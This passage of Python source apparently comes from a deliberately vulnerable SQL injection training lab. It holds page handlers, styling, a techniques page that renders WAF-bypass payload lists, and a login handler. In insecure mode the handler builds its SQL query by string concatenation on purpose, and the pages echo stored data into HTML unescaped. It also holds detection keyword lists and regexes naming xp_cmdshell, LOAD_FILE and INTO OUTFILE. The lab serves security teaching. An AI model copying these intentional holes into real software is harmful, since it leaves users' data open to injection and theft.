        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1>All Products</h1>
                    <p class="subtitle">Products across all users</p>
                </div>
                
                <div class="nav-bar">
                    <a href="/dashboard">Dashboard</a>
                    <a href="/products">My Products</a>
                    <a href="/all-products" class="active">All Products</a>
                    <a href="/users">Users</a>
                    <a href="/logs">Logs</a>
                    <a href="/injection-history">Injection History</a>
                    <a href="/second-order">Second-Order</a>
                    <a href="/logout">Logout</a>
                </div>
                
                <div class="content">
                    <div class="product-list">
                        <h3>All Products</h3>
        """
        
        if products:
            html += "<table class='product-table'>"
            html += "<tr><th>ID</th><th>Name</th><th>Price</th><th>Description</th><th>Stock</th><th>Category</th><th>Sub-Category</th><th>Featured</th><th>Owner</th></tr>"
            for product in products:
                featured = "Yes" if product['is_featured'] else "No"
                html += f"<tr><td>{product['id']}</td><td>{product['name']}</td><td>${product['price']}</td><td>{product['description']}</td><td>{product['stock']}</td><td>{product['category']}</td><td>{product['sub_category']}</td><td>{featured}</td><td>{product['owner']}</td></tr>"
            html += "</table>"
        else:
            html += "<p>No products found.</p>"
        
        html += """
                    </div>
                </div>
                
                <div class="footer">
                    <p>Educational Use Only | DSTERMINAL Enterprise Edition v4.0</p>
                    <p style="font-size:0.7em;color:#444;margin-top:5px;">
                        For more info: <a href="mailto:starkec.team@outlook.com" style="color:#00ffff;">starkec.team@outlook.com</a> | 
                        <a href="mailto:info@starkteamsupport.mw" style="color:#00ffff;">info@starkteamsupport.mw</a>
                    </p>
                </div>
            </div>
        </body>
        </html>
        """
        self._send_html(html)
    
    def _serve_users(self, params):
        cookies = self.headers.get('Cookie', '')
        if 'logged_in=1' not in cookies:
            self._send_error(401, "Please login first")
            return
        
        lab = self.lab_instance
        users = lab.get_users() if lab else []
        
        html = """
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <title>Users - Advanced SQL Injection Lab</title>
            <link rel="stylesheet" href="/styles.css">
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1>Users</h1>
                    <p class="subtitle">All registered users</p>
                </div>
                
                <div class="nav-bar">
                    <a href="/dashboard">Dashboard</a>
                    <a href="/products">My Products</a>
                    <a href="/all-products">All Products</a>
                    <a href="/users" class="active">Users</a>
                    <a href="/logs">Logs</a>
                    <a href="/injection-history">Injection History</a>
                    <a href="/second-order">Second-Order</a>
                    <a href="/logout">Logout</a>
                </div>
                
                <div class="content">
                    <div class="user-list">
                        <h3>Registered Users</h3>
                        <table class="user-table">
                            <tr><th>ID</th><th>Username</th><th>Role</th><th>Department</th><th>Email</th><th>Phone</th><th>Created</th></tr>
        """
        
        for user in users:
            html += f"<tr><td>{user['id']}</td><td>{user['username']}</td><td>{user['role']}</td><td>{user['department']}</td><td>{user['email']}</td><td>{user['phone']}</td><td>{user['created_at']}</td></tr>"
        
        html += """
                        </table>
                    </div>
                </div>
                
                <div class="footer">
                    <p>Educational Use Only | DSTERMINAL Enterprise Edition v4.0</p>
                    <p style="font-size:0.7em;color:#444;margin-top:5px;">
                        For more info: <a href="mailto:starkec.team@outlook.com" style="color:#00ffff;">starkec.team@outlook.com</a> | 
                        <a href="mailto:info@starkteamsupport.mw" style="color:#00ffff;">info@starkteamsupport.mw</a>
                    </p>
                </div>
            </div>
        </body>
        </html>
        """
        self._send_html(html)
    
    def _serve_logs(self):
        cookies = self.headers.get('Cookie', '')
        if 'logged_in=1' not in cookies:
            self._send_error(401, "Please login first")
            return
        
        lab = self.lab_instance
        
        html = """
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <title>Audit Logs - Advanced SQL Injection Lab</title>
            <link rel="stylesheet" href="/styles.css">
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1>Audit Logs</h1>
                </div>
                
                <div class="nav-bar">
                    <a href="/dashboard">Dashboard</a>
                    <a href="/products">My Products</a>
                    <a href="/all-products">All Products</a>
                    <a href="/users">Users</a>
                    <a href="/logs" class="active">Logs</a>
                    <a href="/injection-history">Injection History</a>
                    <a href="/second-order">Second-Order</a>
                    <a href="/logout">Logout</a>
                </div>
                
                <div class="content">
                    <div class="log-list">
                        <h3>Recent Activity</h3>
                        <table class="log-table">
                            <tr><th>User</th><th>Action</th><th>IP</th><th>User Agent</th><th>Request Data</th><th>Timestamp</th></tr>
        """
        
        for log in lab.get_audit_logs(50):
            html += f"<tr><td>{log['username']}</td><td>{log['action']}</td><td>{log['ip']}</td><td>{log['user_agent'][:30] + '...' if len(log['user_agent']) > 30 else log['user_agent']}</td><td>{log['request_data'][:30] + '...' if len(log['request_data']) > 30 else log['request_data']}</td><td>{log['timestamp']}</td></tr>"
        
        html += """
                        </table>
                    </div>
                </div>
                
                <div class="footer">
                    <p>Educational Use Only | DSTERMINAL Enterprise Edition v4.0</p>
                    <p style="font-size:0.7em;color:#444;margin-top:5px;">
                        For more info: <a href="mailto:starkec.team@outlook.com" style="color:#00ffff;">starkec.team@outlook.com</a> | 
                        <a href="mailto:info@starkteamsupport.mw" style="color:#00ffff;">info@starkteamsupport.mw</a>
                    </p>
                </div>
            </div>
        </body>
        </html>
        """
        self._send_html(html)
    
    def _serve_injection_history(self):
        cookies = self.headers.get('Cookie', '')
        if 'logged_in=1' not in cookies:
            self._send_error(401, "Please login first")
            return
        
        lab = self.lab_instance
        attempts = lab.get_injection_attempts(50) if lab else []
        
        html = """
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <title>Injection History - Advanced SQL Injection Lab</title>
            <link rel="stylesheet" href="/styles.css">
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1>Injection History</h1>
                    <p class="subtitle">Record of all SQL injection attempts with WAF detection</p>
                </div>
                
                <div class="nav-bar">
                    <a href="/dashboard">Dashboard</a>
                    <a href="/products">My Products</a>
                    <a href="/all-products">All Products</a>
                    <a href="/users">Users</a>
                    <a href="/logs">Logs</a>
                    <a href="/injection-history" class="active">Injection History</a>
                    <a href="/second-order">Second-Order</a>
                    <a href="/logout">Logout</a>
                </div>
                
                <div class="content">
                    <div class="history-list">
                        <h3>SQL Injection Attempts</h3>
        """
        
        if attempts:
            html += """
            <table class="history-table">
                <tr>
                    <th>Technique</th>
                    <th>Payload</th>
                    <th>User</th>
                    <th>Success</th>
                    <th>WAF Blocked</th>
                    <th>Response Time</th>
                    <th>Timestamp</th>
                </tr>
            """
            for attempt in attempts:
                success_class = "success-badge" if attempt['success'] else "fail-badge"
                success_text = "Yes" if attempt['success'] else "No"
                waf_text = "Yes" if attempt['waf_blocked'] else "No"
                html += f"""
                <tr>
                    <td><span class="tech-badge">{attempt['technique']}</span></td>
                    <td><code class="payload-code">{attempt['payload'][:50]}{'...' if len(attempt['payload']) > 50 else ''}</code></td>
                    <td>{attempt['username']}</td>
                    <td class="{success_class}">{success_text}</td>
                    <td>{waf_text}</td>
                    <td style="font-size:12px;color:#888;">{attempt['response_time']:.3f}s</td>
                    <td style="font-size:12px;color:#888;">{attempt['timestamp']}</td>
                </tr>
                """
            html += "</table>"
        else:
            html += "<p>No injection attempts recorded yet. Try some SQL injection techniques on the login page!</p>"
        
        html += """
                    </div>
                </div>
                
                <div class="footer">
                    <p>Educational Use Only | DSTERMINAL Enterprise Edition v4.0</p>
                    <p style="font-size:0.7em;color:#444;margin-top:5px;">
                        For more info: <a href="mailto:starkec.team@outlook.com" style="color:#00ffff;">starkec.team@outlook.com</a> | 
                        <a href="mailto:info@starkteamsupport.mw" style="color:#00ffff;">info@starkteamsupport.mw</a>
                    </p>
                </div>
            </div>
        </body>
        </html>
        """
        self._send_html(html)
    
    def _serve_techniques(self):
        cookies = self.headers.get('Cookie', '')
        if 'logged_in=1' not in cookies:
            self._send_error(401, "Please login first")
            return
        
        html = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <title>Advanced SQL Injection Techniques - Learning Lab</title>
            <link rel="stylesheet" href="/styles.css">
            <style>
            .techniques-page {{ padding: 20px; }}
            .techniques-grid {{
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(400px, 1fr));
                gap: 20px;
                margin-top: 20px;
            }}
            .technique-card {{
                background: #161b22;
                border-radius: 10px;
                border: 1px solid #30363d;
                overflow: hidden;
                transition: all 0.3s;
            }}
            .technique-card:hover {{
                border-color: #00ffff;
                transform: translateY(-2px);
            }}
            .technique-header {{
                display: flex;
                justify-content: space-between;
                align-items: center;
                padding: 15px 20px;
                background: #1a1a2e;
                border-bottom: 1px solid #30363d;
                flex-wrap: wrap;
            }}
            .technique-header h4 {{
                color: #00ffff;
                margin: 0;
                font-size: 16px;
            }}
            .tech-badge {{
                background: #00ffff22;
                color: #00ffff;
                padding: 2px 12px;
                border-radius: 12px;
                font-size: 12px;
            }}
            .mitre-badge {{
                background: #ff444422;
                color: #ff4444;
                padding: 2px 10px;
                border-radius: 12px;
                font-size: 11px;
                border: 1px solid #ff4444;
            }}
            .technique-body {{ padding: 20px; }}
            .technique-body p {{
                color: #c9d1d9;
                font-size: 14px;
                margin-bottom: 12px;
                line-height: 1.6;
            }}
            .tech-example {{
                background: #0d1117;
                padding: 10px 15px;
                border-radius: 5px;
                border: 1px solid #30363d;
                margin: 10px 0;
            }}
            .tech-example code {{
                color: #ffcc00;
                font-family: 'Consolas', monospace;
                font-size: 14px;
            }}
            .tech-details {{
                margin: 12px 0;
            }}
            .tech-details summary {{
                color: #00ffff;
                cursor: pointer;
                padding: 8px 0;
                font-weight: bold;
            }}
            .tech-details p {{
                color: #c9d1d9;
                padding: 12px;
                background: #0d1117;
                border-radius: 5px;
                margin-top: 8px;
                font-size: 13px;
                line-height: 1.6;
            }}
            .tech-details ul {{
                padding: 10px;
                background: #0d1117;
                border-radius: 5px;
                margin-top: 8px;
            }}
            .tech-details li {{
                padding: 3px 0;
                color: #c9d1d9;
                font-size: 13px;
            }}
            .tech-payloads {{
                margin-top: 12px;
            }}
            .tech-payloads h5 {{
                color: #ffcc00;
                margin-bottom: 8px;
                font-size: 14px;
            }}
            .tech-payloads ul {{
                list-style: none;
                padding: 0;
            }}
            .tech-payloads li {{
                padding: 4px 0;
                font-family: 'Consolas', monospace;
                font-size: 13px;
                color: #00ff88;
                border-bottom: 1px solid #1a1a2e;
            }}
            .tech-payloads li:last-child {{ border-bottom: none; }}
            .payload-code {{
                background: #0d1117;
                padding: 2px 8px;
                border-radius: 3px;
                font-size: 13px;
            }}
            .waf-section {{
                margin-top: 30px;
            }}
            .waf-section h2 {{
                color: #ffcc00;
                margin-bottom: 20px;
            }}
            .waf-grid {{
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
                gap: 20px;
            }}
            .waf-card {{
                background: #161b22;
                border-radius: 10px;
                border: 1px solid #ff444444;
                overflow: hidden;
                transition: all 0.3s;
            }}
            .waf-card:hover {{
                border-color: #ff4444;
                transform: translateY(-2px);
            }}
            .waf-header {{
                display: flex;
                justify-content: space-between;
                align-items: center;
                padding: 15px 20px;
                background: #1a1a2e;
                border-bottom: 1px solid #ff444444;
            }}
            .waf-header h4 {{
                color: #ff4444;
                margin: 0;
                font-size: 16px;
            }}
            .waf-body {{ padding: 20px; }}
            .waf-body p {{
                color: #c9d1d9;
                font-size: 14px;
                line-height: 1.6;
            }}
            .waf-body ul {{
                list-style: none;
                padding: 0;
                margin-top: 10px;
            }}
            .waf-body li {{
                padding: 4px 0;
                font-family: 'Consolas', monospace;
                font-size: 13px;
                color: #ff8888;
                border-bottom: 1px solid #1a1a2e;
            }}
            .waf-body li:last-child {{ border-bottom: none; }}
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1>Advanced SQL Injection Techniques</h1>
                    <p class="subtitle">Complete guide to modern SQL injection attack vectors with WAF bypass</p>
                    <div style="margin-top:10px;display:flex;gap:10px;justify-content:center;flex-wrap:wrap;">
                        <button onclick="location.href='/download-pdf'" class="pdf-download-btn" style="padding:10px 30px;background:linear-gradient(135deg,#ff8800,#ff5500);color:#fff;border:none;border-radius:10px;font-size:14px;font-weight:bold;cursor:pointer;">
                            Download PDF Notes
                        </button>
                        <button onclick="location.href='/second-order'" class="btn-second-order" style="padding:10px 30px;background:linear-gradient(135deg,#ffcc00,#ff8800);color:#0d1117;border:none;border-radius:10px;font-size:14px;font-weight:bold;cursor:pointer;">
                            Second-Order Lab
                        </button>
                    </div>
                </div>
                
                <div class="nav-bar">
                    <a href="/dashboard">Dashboard</a>
                    <a href="/products">My Products</a>
                    <a href="/all-products">All Products</a>
                    <a href="/users">Users</a>
                    <a href="/logs">Logs</a>
                    <a href="/injection-history">Injection History</a>
                    <a href="/second-order">Second-Order</a>
                    <a href="/logout">Logout</a>
                </div>
                
                <div class="techniques-page">
                    <div class="techniques-grid">
        """
        
        for tech_id, tech_data in ADVANCED_SQL_INJECTION_TECHNIQUES.items():
            html += f"""
            <div class="technique-card">
                <div class="technique-header">
                    <h4>{tech_data['name']}</h4>
                    <span class="tech-badge">{len(tech_data['payloads'])} payloads</span>
                    <span class="mitre-badge">{tech_data['mitre_id']}</span>
                </div>
                <div class="technique-body">
                    <p><b>Category:</b> {tech_data['category']}</p>
                    <p>{tech_data['description']}</p>
                    <div class="tech-example">
                        <code>{tech_data['example']}</code>
                    </div>
                    <details class="tech-details">
                        <summary>How it works</summary>
                        <p>{tech_data['explanation']}</p>
                    </details>
                    <details class="tech-details">
                        <summary>WAF Bypass Payloads</summary>
                        <ul>
            """
            if 'waf_bypass_payloads' in tech_data:
                for payload in tech_data['waf_bypass_payloads'][:5]:
                    html += f"<li><code class='payload-code'>{payload}</code></li>"
                if len(tech_data['waf_bypass_payloads']) > 5:
                    html += f"<li class='more-payloads'>... and {len(tech_data['waf_bypass_payloads']) - 5} more</li>"
            html += """
                        </ul>
                    </details>
                    <details class="tech-details">
                        <summary>Detection Indicators</summary>
                        <ul>
            """
            if 'detection_indicators' in tech_data:
                for indicator in tech_data['detection_indicators']:
                    html += f"<li>{indicator}</li>"
            html += """
                        </ul>
                    </details>
                    <button onclick="location.href='/login'" class="test-btn" style="margin-top:15px;">
                        Go to Login & Test
                    </button>
                </div>
            </div>
            """
        
        # WAF Bypass Techniques Section
        html += """
                    </div>
                    
                    <div class="waf-section">
                        <h2>WAF Bypass Techniques</h2>
                        <div class="waf-grid">
        """
        
        for bypass_id, bypass_data in WAF_BYPASS_TECHNIQUES.items():
            html += f"""
            <div class="waf-card">
                <div class="waf-header">
                    <h4>{bypass_data['name']}</h4>
                </div>
                <div class="waf-body">
                    <p>{bypass_data['description']}</p>
                    <ul>
            """
            for example in bypass_data['examples'][:3]:
                html += f"<li><code class='payload-code'>{example}</code></li>"
            if len(bypass_data['examples']) > 3:
                html += f"<li class='more-payloads'>... and {len(bypass_data['examples']) - 3} more</li>"
            html += f"""
                    </ul>
                    <p style="margin-top:10px;font-size:12px;color:#888;">
                        <b>Detection:</b> {bypass_data['detection']}
                    </p>
                </div>
            </div>
            """
        
        html += """
                        </div>
                    </div>
                </div>
                
                <div class="footer">
                    <p>Educational Use Only | DSTERMINAL Enterprise Edition v4.0</p>
                    <p style="font-size:0.7em;color:#444;margin-top:5px;">
                        For more info: <a href="mailto:starkec.team@outlook.com" style="color:#00ffff;">starkec.team@outlook.com</a> | 
                        <a href="mailto:info@starkteamsupport.mw" style="color:#00ffff;">info@starkteamsupport.mw</a>
                    </p>
                </div>
            </div>
        </body>
        </html>
        """
        self._send_html(html)
    
    def _serve_logout(self):
        self.send_response(302)
        self.send_header('Location', '/login')
        self.send_header('Set-Cookie', 'logged_in=0; Max-Age=0')
        self.end_headers()
    
    def _serve_reset(self):
        """Reset the lab database"""
        lab = self.lab_instance
        if lab is None:
            self._send_error(500, "Lab not initialized")
            return
        
        try:
            lab.reset_database()
            self.send_response(302)
            self.send_header('Location', '/dashboard')
            self.end_headers()
        except Exception as e:
            self._send_error(500, f"Error resetting database: {str(e)}")
    

    def _serve_css(self):
        css = """
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background: linear-gradient(135deg, #0d1117 0%, #161b22 100%);
            color: #c9d1d9;
            min-height: 100vh;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }
        .header {
            text-align: center;
            padding: 30px 0;
            border-bottom: 2px solid #00ffff;
            margin-bottom: 30px;
        }
        .header h1 { color: #00ffff; font-size: 2.5em; }
        .subtitle { color: #888; font-size: 1.1em; margin-top: 5px; }
        .header-controls {
            margin-top: 15px;
            display: flex;
            justify-content: center;
            gap: 10px;
            flex-wrap: wrap;
        }
        .learning-toggle-btn {
            padding: 10px 25px;
            background: linear-gradient(135deg, #00ffff, #0088ff);
            color: #0d1117;
            border: none;
            border-radius: 25px;
            font-size: 14px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
        }
        .learning-toggle-btn:hover {
            transform: scale(1.05);
            box-shadow: 0 0 20px rgba(0, 255, 255, 0.3);
        }
        .pdf-download-btn {
            padding: 10px 25px;
            background: linear-gradient(135deg, #ff8800, #ff5500);
            color: #fff;
            border: none;
            border-radius: 25px;
            font-size: 14px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
        }
        .pdf-download-btn:hover {
            transform: scale(1.05);
            box-shadow: 0 0 20px rgba(255, 136, 0, 0.3);
        }
        .waf-toggle-btn {
            padding: 10px 25px;
            background: linear-gradient(135deg, #00ff88, #00cc66);
            color: #0d1117;
            border: none;
            border-radius: 25px;
            font-size: 14px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
        }
        .waf-toggle-btn:hover {
            transform: scale(1.05);
            box-shadow: 0 0 20px rgba(0, 255, 136, 0.3);
        }
        .waf-toggle-btn-off {
            padding: 10px 25px;
            background: linear-gradient(135deg, #ff5555, #cc0000);
            color: #fff;
            border: none;
            border-radius: 25px;
            font-size: 14px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
        }
        .waf-toggle-btn-off:hover {
            transform: scale(1.05);
            box-shadow: 0 0 20px rgba(255, 85, 85, 0.3);
        }
        .btn-pdf {
            background: linear-gradient(135deg, #ff8800, #ff5500) !important;
            color: #fff !important;
        }
        .btn-pdf:hover {
            transform: scale(1.05);
            box-shadow: 0 0 20px rgba(255, 136, 0, 0.3);
        }
        .btn-second-order {
            background: linear-gradient(135deg, #ffcc00, #ff8800) !important;
            color: #0d1117 !important;
        }
        .btn-second-order:hover {
            transform: scale(1.05);
            box-shadow: 0 0 20px rgba(255, 204, 0, 0.3);
        }
        .nav-bar {
            display: flex;
            gap: 20px;
            padding: 15px;
            background: #161b22;
            border-radius: 10px;
            margin-bottom: 30px;
            border: 1px solid #30363d;
            flex-wrap: wrap;
        }
        .nav-bar a {
            color: #c9d1d9;
            text-decoration: none;
            padding: 8px 16px;
            border-radius: 5px;
            transition: all 0.3s;
        }
        .nav-bar a:hover { background: #30363d; }
        .nav-bar a.active { background: #00ffff; color: #0d1117; }
        
        .login-box {
            max-width: 400px;
            margin: 40px auto;
            padding: 40px;
            background: #161b22;
            border-radius: 15px;
            border: 1px solid #30363d;
        }
        .login-box h2 { color: #00ffff; margin-bottom: 20px; text-align: center; }
        .login-box .info { color: #888; text-align: center; margin-bottom: 20px; font-size: 0.9em; }
        .form-group { margin-bottom: 20px; }
        .form-group label { display: block; margin-bottom: 5px; color: #c9d1d9; }
        .form-group input {
            width: 100%;
            padding: 10px;
            border: 1px solid #30363d;
            border-radius: 5px;
            background: #0d1117;
            color: #c9d1d9;
            font-size: 14px;
        }
        .form-group input:focus { outline: none; border-color: #00ffff; }
        button {
            width: 100%;
            padding: 12px;
            background: #00ffff;
            color: #0d1117;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
        }
        button:hover { background: #00dddd; transform: scale(1.02); }
        .hint {
            margin-top: 20px;
            padding: 15px;
            background: #0d1117;
            border-radius: 5px;
            border-left: 3px solid #ffcc00;
        }
        .hint code { background: #30363d; padding: 2px 6px; border-radius: 3px; color: #ffcc00; }
        .hint ul li { padding: 3px 0; font-size: 13px; }
        .small { font-size: 0.8em; color: #888; margin-top: 5px; }
        .footer {
            text-align: center;
            padding: 20px;
            margin-top: 40px;
            border-top: 1px solid #30363d;
            color: #666;
            font-size: 0.8em;
        }
        .footer a { color: #00ffff; text-decoration: none; }
        .footer a:hover { text-decoration: underline; }
        
        .dashboard-content { display: grid; gap: 20px; }
        .status-banner {
            padding: 20px;
            background: #161b22;
            border-radius: 10px;
            border: 2px solid #ffcc00;
            text-align: center;
        }
        .status-banner h3 { color: #ffcc00; margin-bottom: 5px; }
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
        }
        .stat-card {
            padding: 20px;
            background: #161b22;
            border-radius: 10px;
            text-align: center;
            border: 1px solid #30363d;
        }
        .stat-card h3 { color: #888; font-size: 0.9em; margin-bottom: 5px; }
        .stat-number { font-size: 2.5em; color: #00ffff; font-weight: bold; }
        .admin-section, .lab-section, .info-box {
            padding: 20px;
            background: #161b22;
            border-radius: 10px;
            border: 1px solid #30363d;
        }
        .admin-section h3, .lab-section h3, .info-box h3 { color: #00ffff; margin-bottom: 15px; }
        .inline { display: flex; gap: 10px; align-items: center; flex-wrap: wrap; }
        .inline input { flex: 1; min-width: 150px; }
        .inline button { width: auto; padding: 10px 20px; }
        .lab-controls { display: flex; gap: 10px; flex-wrap: wrap; }
        .lab-controls button {
            width: auto;
            padding: 10px 20px;
            font-size: 14px;
        }
        .btn-secure { background: #00ff88; color: #0d1117; }
        .btn-vulnerable { background: #ff5555; color: #fff; }
        .btn-reset { background: #ffcc00; color: #0d1117; }
        .btn-learning { background: #00ffff; color: #0d1117; }
        .btn-second-order { background: #ff8800; color: #0d1117; }
        
        .product-table, .user-table, .log-table, .history-table, .injection-history-table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 15px;
            overflow-x: auto;
            display: block;
            font-size: 13px;
        }
        .product-table th, .user-table th, .log-table th, .history-table th, .injection-history-table th {
            background: #21262d;
            padding: 10px;
            text-align: left;
            color: #00ffff;
            border: 1px solid #30363d;
        }
        .product-table td, .user-table td, .log-table td, .history-table td, .injection-history-table td {
            padding: 10px;
            border: 1px solid #30363d;
        }
        .history-table { font-size: 13px; }
        .history-table td code { font-size: 12px; }
        .success-badge { color: #00ff88; font-weight: bold; }
        .fail-badge { color: #ff5555; font-weight: bold; }
        .tech-badge {
            background: #00ffff22;
            color: #00ffff;
            padding: 2px 10px;
            border-radius: 12px;
            font-size: 12px;
            display: inline-block;
        }
        .payload-code {
            background: #0d1117;
            padding: 2px 6px;
            border-radius: 3px;
            font-family: 'Consolas', monospace;
            font-size: 12px;
            color: #00ff88;
        }
        .user-list-hint {
            max-width: 600px;
            margin: 20px auto;
            padding: 20px;
            background: #161b22;
            border-radius: 10px;
            border: 1px solid #30363d;
        }
        .user-list-hint h4 { color: #00ffff; margin-bottom: 10px; }
        .user-hint-table {
            width: 100%;
            border-collapse: collapse;
            font-size: 0.9em;
        }
        .user-hint-table th {
            text-align: left;
            padding: 8px;
            color: #888;
            border-bottom: 1px solid #30363d;
        }
        .user-hint-table td {
            padding: 8px;
            border-bottom: 1px solid #1a1a2e;
        }
        .username { color: #00ffff; }
        .role { color: #ffcc00; }
        .dept { color: #888; }
        
        .learning-panel {
            background: #161b22;
            border-radius: 10px;
            border: 1px solid #00ffff44;
            margin-bottom: 30px;
            overflow: hidden;
        }
        .learning-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px 20px;
            background: #1a1a2e;
            border-bottom: 1px solid #30363d;
            flex-wrap: wrap;
        }
        .learning-header h2 { color: #00ffff; margin: 0; }
        .close-learning {
            background: #ff555544;
            color: #ff5555;
            border: none;
            padding: 5px 15px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 18px;
            width: auto;
        }
        .close-learning:hover { background: #ff555566; }
        
        .learning-section {
            padding: 15px 0;
            border-bottom: 1px solid #1a1a2e;
        }
        .learning-section:last-child { border-bottom: none; }
        .learning-section h3 { color: #00ffff; margin-bottom: 10px; }
        .learning-section p { color: #c9d1d9; line-height: 1.6; }
        .example-box {
            background: #0d1117;
            padding: 15px;
            border-radius: 5px;
            border: 1px solid #30363d;
            margin: 10px 0;
        }
        .example-box code {
            display: block;
            padding: 10px;
            background: #1a1a2e;
            border-radius: 3px;
            color: #ffcc00;
            font-family: 'Consolas', monospace;
            font-size: 13px;
            overflow-x: auto;
        }
        .example-box .explanation {
            margin-top: 8px;
            color: #888;
            font-size: 13px;
        }
        
        .waf-status-banner {
            padding: 15px;
            background: #161b22;
            border-radius: 10px;
            border: 2px solid #ff4444;
            text-align: center;
            margin-bottom: 20px;
        }
        .waf-status-banner h3 { color: #ff4444; margin-bottom: 5px; }
        
        @media (max-width: 768px) {
            .inline { flex-direction: column; }
            .stats-grid { grid-template-columns: 1fr; }
            .nav-bar { flex-direction: column; align-items: stretch; }
            .techniques-grid { grid-template-columns: 1fr; }
            .waf-grid { grid-template-columns: 1fr; }
        }
        """
        self.send_response(200)
        self.send_header('Content-Type', 'text/css')
        self.end_headers()
        self.wfile.write(css.encode('utf-8'))
    
    def _handle_login(self, params):
        lab = self.lab_instance
        if lab is None:
            self._send_error(500, "Lab not initialized")
            return
        username = params.get('username', [''])[0]
        password = params.get('password', [''])[0]
        
        
        # Check if this is a SQL injection attempt - IMPROVED DETECTION
        is_injection = any(char in username for char in ["'", '"', ';', '--', '/*', '*/', 'UNION', 'SELECT', 'DROP', 'DELETE', 'SLEEP', 'BENCHMARK', 'WAITFOR', 'xp_cmdshell', 'LOAD_FILE', 'INTO OUTFILE', 'OR', 'AND'])
        
        # Check for OR/AND patterns even without special characters
        if not is_injection:
            if ' OR ' in username.upper() or ' AND ' in username.upper():
                if '=' in username or "'" in username:
                    is_injection = True
        
        # WAF Detection
        waf_blocked = False
        if lab.waf_mode and is_injection:
            waf_patterns = [
                r"['\"]\s*(OR|AND|UNION|SELECT|INSERT|UPDATE|DELETE|DROP|ALTER|CREATE|TRUNCATE|EXEC|SLEEP|WAITFOR|BENCHMARK|LOAD_FILE|INTO OUTFILE)",
                r"--\s*$",
                r"/\*.*\*/",
                r";\s*(DROP|DELETE|UPDATE|INSERT|ALTER|CREATE|TRUNCATE|EXEC)",
                r"UNION\s+SELECT",
                r"SLEEP\s*\(",
                r"WAITFOR\s+DELAY",
                r"BENCHMARK\s*\(",
                r"LOAD_FILE\s*\(",
                r"INTO\s+OUTFILE",
                r"CONVERT\s*\(",
                r"CAST\s*\(",
                r"xp_cmdshell"
            ]
            
            for pattern in waf_patterns:
                if re.search(pattern, username, re.IGNORECASE):
                    waf_blocked = True
                    break
            
            if '%' in username or '\\x' in username:
                waf_blocked = True
            
            if '\x00' in username or '%00' in username:
                waf_blocked = True
        
        if waf_blocked:
            technique = lab.detect_technique(username)
            lab.log_injection_attempt(technique, username, 'test_user', success=False, waf_blocked=True)
            lab.add_audit_log('test_user', f"WAF blocked injection attempt: {technique}", request_data=username[:100])
            
            self._serve_login_form(
                error=f"WAF blocked injection attempt!",
                message=f"Technique: {technique}\nYour payload was detected and blocked by the WAF."
            )
            return
        
        start_time = time.time()
        
        # ========================================================================
        # VULNERABLE: Direct string concatenation
        # ========================================================================
        if not lab.secure_mode:
            query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
            print(f"[DEBUG] Vulnerable query: {query}")
            try:
                conn = lab._get_db_connection()
                if conn:
                    cursor = conn.cursor()
                    cursor.execute(query)
                    results = cursor.fetchall()
                    conn.close()
                    
                    if results:
                        print(f"[DEBUG] Query returned {len(results)} results!")
                        
                        # ============================================================
                        # CHECK IF THIS IS A SUCCESSFUL INJECTION
                        # ============================================================
                        if is_injection:
                            # Get the first user from results
                            first_user = results[0]
                            # Try to get user by username from the result
                            user = lab.get_user_by_username(first_user[1]) if len(first_user) > 1 else None
                            
                            if not user:
                                # Fallback: get admin user
                                users = lab.get_users()
                                if users:
                                    user = users[0]
                            
                            if user:
                                response_time = time.time() - start_time
                                technique = lab.detect_technique(username)
                                lab.log_injection_attempt(technique, username, user['username'], success=True, waf_blocked=False, response_time=response_time)
                                lab.add_audit_log(user['username'], f"Login successful via SQL injection: {technique}", request_data=f"username={username}")
                                lab._update_last_login(user['id'])
                                
                                self.send_response(302)
                                self.send_header('Location', '/dashboard')
                                self.send_header('Set-Cookie', f'logged_in=1; Path=/; HttpOnly')
                                self.send_header('Set-Cookie', f'username={user["username"]}; Path=/; HttpOnly')
                                self.send_header('Content-Length', '0')
                                self.end_headers()
                                return
                        
                        # ============================================================
                        # NON-INJECTION: Try normal authentication
                        # ============================================================
                        else:
                            user = None
                            for row in results:
                                if len(row) > 1 and row[1] == username:
                                    user = lab.get_user_by_username(username)
                                    break
                            
                            if not user and results:
                                user = lab.get_user_by_username(results[0][1]) if len(results[0]) > 1 else None
                            
                            if user:
                                lab.add_audit_log(user['username'], "Login successful (vulnerable mode)")
                                lab._update_last_login(user['id'])
                                
                                self.send_response(302)
                                self.send_header('Location', '/dashboard')
                                self.send_header('Set-Cookie', f'logged_in=1; Path=/; HttpOnly')
                                self.send_header('Set-Cookie', f'username={user["username"]}; Path=/; HttpOnly')
                                self.send_header('Content-Length', '0')
                                self.end_headers()
                                return
                    else:
                        print(f"[DEBUG] Query returned no results")
                        
                        # ============================================================
                        # CHECK FOR INJECTION EVEN IF NO RESULTS (Blind injection)
                        # ============================================================
                        if is_injection:
                            # For OR injections that might not return results but still indicate vulnerability
                            if 'OR' in username.upper() and ("'" in username or '"' in username):
                                technique = lab.detect_technique(username)
                                response_time = time.time() - start_time
